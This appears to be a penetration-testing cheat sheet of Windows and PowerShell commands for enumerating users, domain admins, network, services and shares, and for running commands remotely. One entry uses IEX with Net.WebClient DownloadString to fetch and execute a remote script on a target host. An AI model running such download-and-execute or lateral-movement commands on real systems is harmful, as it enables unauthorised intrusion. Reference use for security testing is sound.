# Windows Command

## Table of Contents

- [User Enumeration](#user-enumeration)
- [System Information](#system-information)
- [Network Enumeration](#network-enumeration)
- [Process and Service Enumeration](#process-and-service-enumeration)
- [Share Enumeration](#share-enumeration)
- [Remote Command Execution](#remote-command-execution)
- [PowerShell Remoting Cmdlets](#powershell-remoting-cmdlets)

---

## User Enumeration

- List local users

    ```shell
    Get-LocalUser
    ```

- List domain users

    ```
    Get-ADUser -Filter *
    ```

- Get current user

    ```shell
    whoami
    $env:USERNAME
    ```

- Get user groups

    ```shell
    whoami /groups
    Get-LocalGroup
    Get-ADGroupMember "Domain Admins"
    ```

---

## System Information

```shell
systeminfo
Get-ComputerInfo
```

- OS version

    ```shell
    [System.Environment]::OSVersion
    Get-WmiObject Win32_OperatingSystem
    ```

- Architecture

    ```shell
    [System.Environment]::Is64BitOperatingSystem
    $env:PROCESSOR_ARCHITECTURE
    ```
- Hostname

    ```shell
    hostname
    $env:COMPUTERNAME
    ```

- Domain information

    ```shell
    Get-WmiObject Win32_ComputerSystem | Select Domain
    ```

---

## Network Enumeration

- Network interfaces

    ```shell
    ipconfig /all
    Get-NetIPAddress
    Get-NetIPConfiguration
    ```

- Routing table

    ```shell
    route print
    Get-NetRoute
    ```

- ARP table

    ```shell
    arp -a
    Get-NetNeighbor
    ```

-  Active connections

    ```shell
    netstat -ano
    Get-NetTCPConnection
    ```

- DNS cache

    ```shell
    ipconfig /displaydns
    Get-DnsClientCache
    ```

---

## Process and Service Enumeration

-  List running processes

    ```shell
    Get-Process
    tasklist /v
    ```

- Enumerate Windows services

    ```shell
    Get-Service
    sc query
    ```

- List scheduled tasks

    ```shell
    Get-ScheduledTask
    schtasks /query /fo LIST /v
    ```

-  List startup programs

    ```shell
    Get-CimInstance Win32_StartupCommand
    wmic startup get caption,command
    ```

---

## Share Enumeration

- List shares

    ```shell
    net share
    Get-SmbShare
    Get-WmiObject Win32_Share
    ```

- Access shares

    ```shell
    net use \\target\share
    Get-SmbMapping
    ```

- Find accessible shares on network

    ```shell
    Get-SmbShare -CimSession (Get-ADComputer -Filter *).Name
    ```

---

## Remote Command Execution

- Basic command execution

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock { whoami }
    ```

- Multiple commands

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock { whoami hostname ipconfig }
    ```

- Execute local script on remote

    ```shell
    Invoke-Command -ComputerName $rhost -FilePath .\script.ps1
    ```

- Download and execute

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock  {IEX(New-Object Net.WebClient).DownloadString('http://$rhost/script.ps1')}
    ```

---

## PowerShell Remoting Cmdlets

- Interactive Remote Session

    ```shell
    Enter-PSSession -ComputerName $rhost
    ```

- Exit Remote Session

    ```shell
    Exit-PSSession
    ```

- Run Command Remotely

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock {cmd}
    ```

- Create persistent session

    ```shell
    $s = New-PSSession -ComputerName $rhost
    ```

- Close session

    ```shell
    Remove-PSSession -Session $s
    ```
- List active sessions

    ```shell
    Get-PSSession
    ```